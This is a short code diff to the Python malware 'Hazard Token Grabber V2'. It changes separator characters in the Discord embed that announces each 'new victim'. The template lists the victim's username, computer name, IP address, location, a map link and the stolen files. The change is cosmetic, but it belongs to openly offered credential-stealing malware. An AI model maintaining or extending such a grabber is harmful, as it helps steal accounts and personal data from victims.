@@ -225,7 +225,7 @@ class Hazard_Token_Grabber_V2:
                         "url": "https://github.com/Rdimo/Hazard-Token-Grabber-V2",
                         "icon_url": "https://cdn.discordapp.com/attachments/828047793619861557/891698193245560862/Hazard.gif"
                     },
-                    "description": f"𝗡𝗲𝘄 𝘃𝗶𝗰𝘁𝗶𝗺 𝘁𝗼 𝑯𝒂𝒛𝒂𝒓𝒅 𝑻𝒐𝒌𝒆𝒏 𝑮𝒓𝒂𝒃𝒃𝒆𝒓.𝑽2\n```fix\nUsername・{os.getlogin()}\nComputerName・{os.getenv('COMPUTERNAME')}\nIP・{ip}\nCity・{city}\nRegion・{region}\nCountry・{country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```",
+                    "description": f"𝗡𝗲𝘄 𝘃𝗶𝗰𝘁𝗶𝗺 𝘁𝗼 𝑯𝒂𝒛𝒂𝒓𝒅 𝑻𝒐𝒌𝒆𝒏 𝑮𝒓𝒂𝒃𝒃𝒆𝒓.𝑽2\n```fix\nUsername: {os.getlogin()}\nComputerName: {os.getenv('COMPUTERNAME')}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```",
                     "color": 16119101,
 
                     "thumbnail": {
@@ -233,7 +233,7 @@ class Hazard_Token_Grabber_V2:
                     },       
 
                     "footer": {
-                      "text": "©Rdimo#6969・https://github.com/Rdimo/Hazard-Token-Grabber-V2"
+                      "text": "©Rdimo#6969 https://github.com/Rdimo/Hazard-Token-Grabber-V2"
                     }
                 }
             ]
